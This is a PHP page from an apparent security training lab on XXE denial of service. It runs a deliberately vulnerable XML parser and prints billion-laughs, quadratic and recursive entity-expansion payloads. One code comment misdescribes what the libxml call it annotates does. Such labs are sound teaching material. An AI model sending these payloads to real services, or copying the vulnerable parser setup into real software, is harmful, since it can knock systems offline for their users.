<?php include '../includes/header.php'; ?>

        <div class="main-content">
            <h2>Level 7 - XXE Denial of Service</h2>
            
            <div style="margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; border-left: 3px solid #007bff;">
                <h3>📖 Lab Description</h3>
                <p>
                    This lab demonstrates XXE-based Denial of Service (DoS) attacks using XML entity expansion. 
                    These attacks exploit the way XML parsers handle entity references, causing them to consume 
                    excessive CPU and memory resources.
                </p>
            </div>

            <div class="xml-form">
                <h3>XML Input:</h3>
                <form method="POST">
                    <textarea name="xml_input" placeholder="Enter XML here..."><?php 
                        echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY a "1">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
    <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
]>
<data>
    <content>&e;</content>
</data>'); 
                    ?></textarea>
                    <br>
                    <button type="submit">Parse XML</button>
                </form>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_input'])) {
                $xml = $_POST['xml_input'];
                
                // Intentionally vulnerable - no limits on entity expansion!
                $startTime = microtime(true);
                $internalErrors = libxml_use_internal_errors(true);
                
                // Disable libxml entity limits (for demonstration purposes only!)
                // In real scenarios, these limits should be properly configured
                libxml_disable_entity_loader(false);
                
                try {
                    $result = simplexml_load_string($xml);
                    $endTime = microtime(true);
                    $duration = round(($endTime - $startTime) * 1000, 2);
                    
                    if ($result) {
                        echo '<div class="results">';
                        echo '<h3>✅ Parsing Results:</h3>';
                        echo '<p><strong>Parsing Time:</strong> ' . $duration . 'ms</p>';
                        echo '<pre>' . htmlspecialchars(print_r($result, true)) . '</pre>';
                        echo '</div>';
                    } else {
                        echo '<div class="error">';
                        echo '<h3>❌ Parsing Error:</h3>';
                        $errors = libxml_get_errors();
                        foreach ($errors as $error) {
                            echo '<pre>' . htmlspecialchars($error->message) . '</pre>';
                        }
                        echo '</div>';
                    }
                } catch (Exception $e) {
                    $endTime = microtime(true);
                    $duration = round(($endTime - $startTime) * 1000, 2);
                    echo '<div class="error">';
                    echo '<h3>💥 Fatal Error:</h3>';
                    echo '<p><strong>Processing Time:</strong> ' . $duration . 'ms</p>';
                    echo '<pre>' . htmlspecialchars($e->getMessage()) . '</pre>';
                    echo '</div>';
                }
                
                libxml_use_internal_errors($internalErrors);
            }
            ?>

            <div class="examples">
                <h3>💣 DoS Payloads:</h3>
                
                <h4>Billion Laughs Attack:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY a "1">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
    <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
    <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
    <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
]>
<data>
    <content>&g;</content>
</data>'); ?></pre>
                
                <h4>Quadratic Entity Expansion:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY a "1234567890">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<data>
    <content>&d;</content>
</data>'); ?></pre>
                
                <h4>Recursive Entity Expansion:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY a "&b;">
    <!ENTITY b "&a;">
]>
<data>
    <content>&a;</content>
</data>'); ?></pre>
            </div>

            <div class="hints">
                <h3>💡 Hints:</h3>
                <ul>
                    <li>Watch the parsing time - it will increase dramatically</li>
                    <li>The server may become unresponsive or crash</li>
                    <li>Larger entity chains cause more resource consumption</li>
                    <li>Recursive entities can cause infinite loops</li>
                </ul>
            </div>

            <div style="margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 5px; border-left: 3px solid #ffc107;">
                <h3>⚠️ Warning:</h3>
                <p>
                    These DoS attacks can cause significant server stress. Run them responsibly and only on 
                    your own test systems. The server may become unresponsive if you use extremely large payloads.
                </p>
            </div>
        </div>

<?php include '../includes/footer.php'; ?>
